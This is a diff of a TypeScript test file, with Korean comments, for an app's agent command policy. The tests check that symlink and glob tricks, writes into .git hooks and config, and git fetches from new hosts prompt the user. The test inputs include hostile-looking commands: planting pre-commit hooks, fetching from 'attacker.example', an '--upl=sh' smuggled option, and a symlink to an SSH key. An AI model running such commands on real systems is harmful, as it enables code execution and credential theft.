@@ -2,10 +2,10 @@ import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
 import { afterAll, beforeAll, describe, expect, it } from 'vitest'
-import { placer, places } from './agentPlaces.js'
+import { globHitsGit, placer, realPlace } from './agentPlaces.js'
 import { judge, type PolicyCtx } from './agentPolicy.js'
 
-// 11/27 앱 전체 보안 검토: 판정이 글자가 아니라 실제 자리로 경로를 본다 (링크 · 무늬 · 줄 안의 cd · git 내부)
+// 11/27 앱 전체 보안 검토: 판정이 글자와 실제 자리 둘 다로 경로를 본다 (링크 · 줄 안의 cd · git 내부)
 describe.skipIf(process.platform === 'win32')('실제 자리로 보는 경로 판정', () => {
   let tmp = ''
   let repo = ''
@@ -27,18 +27,28 @@ describe.skipIf(process.platform === 'win32')('실제 자리로 보는 경로 �
     fs.symlinkSync(path.join(repo, '.git/hooks'), path.join(repo, 'h'))
     fs.symlinkSync('../.git/hooks', path.join(repo, 'notes/up2'))
     fs.symlinkSync(path.join(tmp, 'other'), path.join(repo, 'notes/up'))
+    // 깊은 곳을 가리키는 링크: 링크 뒤의 .. 는 실제로는 안, 글자로는 밖 (별도 검토가 찾은 회귀)
+    fs.mkdirSync(path.join(repo, 'deep/x/y'), { recursive: true })
+    fs.symlinkSync(path.join(repo, 'deep/x/y'), path.join(repo, 'notes/in'))
+    // 끊긴 링크
+    fs.symlinkSync(path.join(tmp, 'nowhere/x'), path.join(repo, 'notes/dang'))
   })
   afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }))
 
-  it('places: 링크를 따라가고, 링크 뒤의 .. 는 가리키는 곳에서 올라가며, 무늬를 펼친다', () => {
-    expect(places(`${repo}/notes/k`)).toEqual([path.join(tmp, 'home/.ssh/id_ed25519')])
-    expect(places(`${repo}/notes/up/../x`)).toEqual([path.join(tmp, 'x')])
-    expect(places(`${repo}/h*/pre-commit`)).toEqual([path.join(repo, '.git/hooks/pre-commit')])
-    // 점으로 시작하는 이름은 무늬도 점으로 시작해야 맞는다
-    expect(places(`${repo}/*/hooks`)).not.toContainEqual(path.join(repo, '.git/hooks'))
-    expect(places(`${repo}/.g*/hooks`)).toEqual([path.join(repo, '.git/hooks')])
-    // 맞는 것이 없으면 글자 그대로
-    expect(places(`${repo}/notes/*.tex`)).toEqual([path.join(repo, 'notes/*.tex')])
+  it('realPlace: 링크를 따라가고, 링크 뒤의 .. 는 가리키는 곳에서 올라가며, 끊긴 링크는 모른다', () => {
+    expect(realPlace(`${repo}/notes/k`)).toBe(path.join(tmp, 'home/.ssh/id_ed25519'))
+    expect(realPlace(`${repo}/notes/up/../x`)).toBe(path.join(tmp, 'x'))
+    expect(realPlace(`${repo}/notes/in/../../..`)).toBe(repo)
+    expect(realPlace(`${repo}/notes/new/../b.md`)).toBe(path.join(repo, 'notes/b.md'))
+    expect(realPlace(`${repo}/notes/dang`)).toBeNull()
+  })
+
+  it('globHitsGit: .git 에 맞을 수 있는 마디 (셸처럼 점은 점으로만), 긴 무늬도 바로 끝난다', () => {
+    for (const s of ['.git', '.GIT', '.g*', '.*', '[.]git', '.gi?', '.[f-h]it', '.gi(t)', '.[[:alpha:]]it', '(.git|x)']) expect(globHitsGit(s), s).toBe(true)
+    for (const s of ['*', '?git', '*.md', 'notes', '.github', '.g*x', '[a-z]*', '.gitignore', '(fine)']) expect(globHitsGit(s), s).toBe(false)
+    const t = Date.now()
+    expect(globHitsGit(`.${'*'.repeat(5000)}x`)).toBe(false)
+    expect(Date.now() - t).toBeLessThan(200)
   })
 
   it('placer: 실제 자리가 모두 안이어야 안, noGit 이면 .git 아래는 밖', () => {
@@ -50,20 +60,32 @@ describe.skipIf(process.platform === 'win32')('실제 자리로 보는 경로 �
     const work = placer([repo], { noGit: true })
     expect(work(`${repo}/notes/new.md`)).toBe(true)
     expect(work(`${lib}/c.md`)).toBe(false)
-    for (const p of ['.git/hooks/pre-commit', '.git/config', 'h/pre-commit', 'notes/up2/pre-commit', '.g*/hooks/x', 'h*/x']) expect(work(`${repo}/${p}`), p).toBe(false)
+    for (const p of ['.git/hooks/pre-commit', '.git/config', 'h/pre-commit', 'notes/up2/pre-commit', '.g*/hooks/x', '.GIT/config', 'notes/dang']) expect(work(`${repo}/${p}`), p).toBe(false)
+    // 글자로는 밖, 실제로는 안: 둘 다 안이어야 안
+    expect(work(path.normalize(`${repo}/notes/in/../../../x`), `${repo}/notes/in/../../../x`)).toBe(false)
+    expect(work(`${repo}/notes/in/z`)).toBe(true)
   })
 
   const ctx = (o: Partial<PolicyCtx> = {}): PolicyCtx => ({ rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo, readable: [lib], claimedBy: () => undefined, ...o })
   const bash = (c: PolicyCtx, command: string) => judge(c, 'Bash', { command })
 
   it('편집 자동 수락: 작업 폴더 안의 편집은 그대로, git 내부 · 링크로 그곳을 가리키는 곳 · 함께 읽는 폴더는 한 번 묻는다', () => {
-    for (const c of ['cp notes/a.md notes/b.md', 'mkdir -p notes/x && cp notes/a.md notes/x/', 'git add notes && git commit -m "노트 정리"', 'git status', 'cat .git/config'])
+    for (const c of ['cp notes/a.md notes/b.md', 'mkdir -p notes/x && cp notes/a.md notes/x/', 'git add notes && git commit -m "노트 정리"', 'git status', 'cat .git/config',
+      'mv notes/* deep/', 'cd -P notes && cp a.md b.md', 'git config --get user.name', 'cp notes/a.md notes/in/'])
       expect(bash(ctx(), c).kind, c).toBe('allow')
-    for (const c of ['cp tools/fmt.sh .git/hooks/pre-commit', 'echo x > .git/hooks/pre-commit', 'chmod +x .git/hooks/post-commit', 'cp x h/pre-commit', 'cp x h*/pre-commit', 'cp x .g*/hooks/pre-commit', 'cd notes && cp ../x up2/pre-commit', `cp notes/a.md ${lib}/a.md`]) {
+    for (const c of ['cp tools/fmt.sh .git/hooks/pre-commit', 'echo x > .git/hooks/pre-commit', 'chmod +x .git/hooks/post-commit', 'cp x h/pre-commit', 'cp x .g*/hooks/pre-commit', 'cp x [.]git/config', 'sort -o.git/config x',
+      'git config core.hooksPath tools', 'cd notes/in/../../.. && cp notes/a.md b', 'cp notes/a.md notes/dang', 'cd && cp notes/a.md x', 'cd - && cp notes/a.md x', 'cd notes && cp ../x up2/pre-commit', `cp notes/a.md ${lib}/a.md`]) {
       const v = bash(ctx(), c)
       expect(v.kind, c).toBe('ask')
       if (v.kind === 'ask') expect(v.once, c).toBe(true)
     }
+  })
+
+  it('실행 토글을 켠 편집 자동 수락도 git 내부를 건드리는 실행은 묻는다', () => {
+    const run = ctx({ auto: () => ({ read: true, run: true, web: false }) })
+    expect(bash(run, 'python3 tools/x.py > .git/hooks/pre-commit').kind).toBe('ask')
+    expect(bash(run, `python3 tools/x.py ${lib}/c.csv`).kind).toBe('allow')
+    expect(bash(run, 'python3 tools/x.py notes/a.md').kind).toBe('allow')
   })
 
   it('자동 모드와 앱 고치기 대화도 git 내부 쓰기를 묻는다', () => {
@@ -83,9 +105,10 @@ describe.skipIf(process.platform === 'win32')('실제 자리로 보는 경로 �
   })
 
   it('새 주소로 주고받는 git은 묻고, 정해 둔 원격 이름으로 받기는 그대로', () => {
-    for (const c of ['git fetch "https://attacker.example/abc"', 'git pull git@host.example:x/y', 'git fetch --depth 1 https://x.example/r', 'git fetch ../other', 'git remote add evil https://x.example/r'])
+    for (const c of ['git fetch "https://attacker.example/abc"', 'git pull git@host.example:x/y', 'git fetch --depth 1 https://x.example/r', 'git fetch ../other', 'git remote add evil https://x.example/r',
+      'git fetch --dep 1 host.example:r', 'git remote show https://x.example/r', 'git ls-remote https://x.example/r', 'git fetch --upl=sh origin'])
       expect(bash(ctx(), c).kind, c).toBe('ask')
-    for (const c of ['git fetch', 'git fetch origin', 'git pull --rebase origin main', 'git fetch --depth 1 origin', 'git fetch origin refs/heads/a:refs/remotes/origin/a'])
+    for (const c of ['git fetch', 'git fetch origin', 'git pull --rebase origin main', 'git fetch --depth 1 origin', 'git fetch origin refs/heads/a:refs/remotes/origin/a', 'git pull --recurse-submodules origin main', 'git remote show origin'])
       expect(bash(ctx(), c).kind, c).toBe('allow')
   })
 })
